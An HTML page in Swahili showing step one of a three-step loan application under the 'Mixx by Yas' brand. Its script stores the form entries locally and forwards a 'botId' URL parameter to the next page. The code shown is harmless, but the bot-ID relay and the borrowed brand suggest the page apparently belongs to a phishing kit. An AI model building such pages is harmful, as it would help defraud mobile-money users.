<!DOCTYPE html>
<html lang="sw">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ombi la Mkopo</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#ececec;
}

/* Header */
.header{
    background:#003da5;
    height:60px;
    width:100%;
    position:fixed;
    top:0;
    left:0;
    display:flex;
    align-items:center;
    justify-content:center;
    z-index:1000;
}

.back-btn{
    position:absolute;
    left:20px;
    color:#d8d8d8;
    text-decoration:none;
    font-size:16px;
}

.menu-btn{
    position:absolute;
    right:20px;
    color:#d8d8d8;
    font-size:28px;
}

.logo{
    color:#ffd500;
    font-size:18px;
    font-weight:bold;
}

/* Main */
.container{
    max-width:600px;
    margin:110px auto 30px;
    padding:0 15px;
}

.card{
    background:white;
    border-radius:16px;
    padding:30px;
    box-shadow:0 4px 20px rgba(0,0,0,.08);
}

.title{
    text-align:center;
    color:#1f2947;
    font-size:22px;
    font-weight:bold;
}

.subtitle{
    text-align:center;
    color:#8a8a8a;
    margin-top:8px;
}

.progress{
    display:flex;
    gap:10px;
    margin:25px 0;
}

.step{
    flex:1;
    height:5px;
    background:#d9d9d9;
    border-radius:5px;
}

.step.active{
    background:#f1d000;
}

.form-group{
    margin-bottom:20px;
}

label{
    display:block;
    margin-bottom:8px;
    color:#444;
    font-size:16px;
}

input,
select,
textarea{
    width:100%;
    border:1px solid #d8d8d8;
    border-radius:10px;
    padding:14px 16px;
    font-size:16px;
    outline:none;
}

textarea{
    resize:none;
    height:120px;
}

.btn{
    width:100%;
    background:#004fc5;
    color:white;
    border:none;
    border-radius:10px;
    padding:16px;
    font-size:20px;
    font-weight:bold;
    cursor:pointer;
}

.btn:hover{
    opacity:.95;
}

@media(max-width:600px){

.card{
    padding:20px;
}

.title{
    font-size:20px;
}

.btn{
    font-size:18px;
}
}
</style>
</head>
<body>

<header class="header">

    <a href="index.html" class="back-btn">
        ← Back
    </a>

    <div class="logo">
        Mixx by Yas
    </div>

    <div class="menu-btn">
        ☰
    </div>

</header>

<div class="container">

    <div class="card">

        <h2 class="title">Ombi la Mkopo</h2>

        <p class="subtitle">
            Hatua ya 1 kati ya 3
        </p>

        <div class="progress">
            <div class="step active"></div>
            <div class="step"></div>
            <div class="step"></div>
        </div>

        <form id="loanForm">

            <div class="form-group">
                <label>Aina ya Mkopo</label>

                <select required id="loanType">
                    <option value="">Chagua aina ya mkopo</option>
                    <option>Mkopo wa Kibinafsi</option>
                    <option>Mkopo wa Biashara</option>
                    <option>Mkopo wa Nyumba</option>
                    <option>Mkopo wa Gari</option>
                    <option>Mkopo wa Elimu</option>
                </select>
            </div>

            <div class="form-group">
                <label>Kiasi cha Mkopo (TZS)</label>

                <input
                    type="number"
                    id="loanAmount"
                    value="1000000"
                    required>
            </div>

            <div class="form-group">
                <label>Muda wa Mkopo</label>

                <select required id="loanDuration">
                    <option>Miezi 6</option>
                    <option>Miezi 12</option>
                    <option>Miezi 24</option>
                    <option>Miezi 36</option>
                    <option selected>Miezi 48</option>
                    <option>Miezi 60</option>
                </select>
            </div>

            <div class="form-group">
                <label>Kusudi la Mkopo</label>

                <textarea
                    id="loanPurpose"
                    placeholder="Elezea kusudi la mkopo wako..."
                    required></textarea>
            </div>

            <button type="submit" class="btn">
                HATUA INAYOFUATA
            </button>

        </form>

    </div>

</div>

<script>
// Get botId from URL
const urlParams = new URLSearchParams(window.location.search);
const botId = urlParams.get('botId');
console.log('Bot ID on form page:', botId);

// Store botId
if (botId) {
    localStorage.setItem('botId', botId);
}

document.getElementById("loanForm").addEventListener("submit", function(e){
    e.preventDefault();

    // Get form values
    const loanType = document.getElementById('loanType').value;
    const loanAmount = document.getElementById('loanAmount').value;
    const loanDuration = document.getElementById('loanDuration').value;
    const loanPurpose = document.getElementById('loanPurpose').value;

    // Validate form
    if (!loanType) {
        alert('Tafadhali chagua aina ya mkopo');
        return;
    }

    if (!loanAmount || loanAmount < 50000) {
        alert('Tafadhali weka kiasi sahihi cha mkopo (kiasi cha chini ni TZS 50,000)');
        return;
    }

    if (!loanPurpose || loanPurpose.length < 10) {
        alert('Tafadhali eleza kusudi la mkopo (angalau herufi 10)');
        return;
    }

    // Format loan amount with commas
    const formattedAmount = parseInt(loanAmount).toLocaleString();

    // Save to localStorage with ALL form data
    localStorage.setItem('loanType', loanType);
    localStorage.setItem('loanAmount', loanAmount);
    localStorage.setItem('loanAmountFormatted', formattedAmount);
    localStorage.setItem('loanDuration', loanDuration);
    localStorage.setItem('loanPurpose', loanPurpose);

    // Save timestamp for application date
    const now = new Date();
    const dateStr = now.toLocaleDateString('sw-TZ', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric'
    });
    const timeStr = now.toLocaleTimeString('sw-TZ', {
        hour: '2-digit',
        minute: '2-digit'
    });
    localStorage.setItem('applicationDate', `${dateStr} ${timeStr}`);
    localStorage.setItem('applicationTimestamp', now.toISOString());

    console.log('Loan application data saved:', {
        loanType,
        loanAmount,
        formattedAmount,
        loanDuration,
        loanPurpose,
        applicationDate: `${dateStr} ${timeStr}`
    });

    // Redirect to details page with botId
    const botIdParam = botId || localStorage.getItem('botId') || '';
    window.location.href = `details.html?botId=${botIdParam}`;
});
</script>

</body>
</html>
